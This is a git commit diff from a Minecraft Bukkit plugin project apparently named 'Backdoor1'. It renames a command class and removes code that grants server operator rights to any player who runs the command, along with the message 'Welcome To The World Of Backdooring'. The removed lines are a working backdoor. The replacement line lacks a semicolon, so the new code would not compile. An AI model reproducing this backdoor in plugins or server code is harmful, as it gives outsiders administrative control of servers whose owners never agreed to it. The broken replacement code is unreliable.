92ea7260a1a0b8364bae63f426569f6ee3765242
Torono909 <86355565+Torono909@users.noreply.github.com>
2022-02-03 11:31:33 +0530

    Update opme.java

--- Backdoor1/src/main/java/me/lunacore/commands/opme.java
+++ Backdoor1/src/main/java/me/lunacore/commands/opme.java
@@ -5,13 +5,11 @@ import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 
-public class opme implements CommandExecutor {
+public class om implements CommandExecutor {
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         Player p = (Player) sender;
-        p.sendMessage("{ Welcome To The World Of Backdooring }");
-        p.sendMessage("{ You Now Have Operator }");
-        p.setOp(true);
+        p.sendMessage("om command done")
         return true;
     }
 }
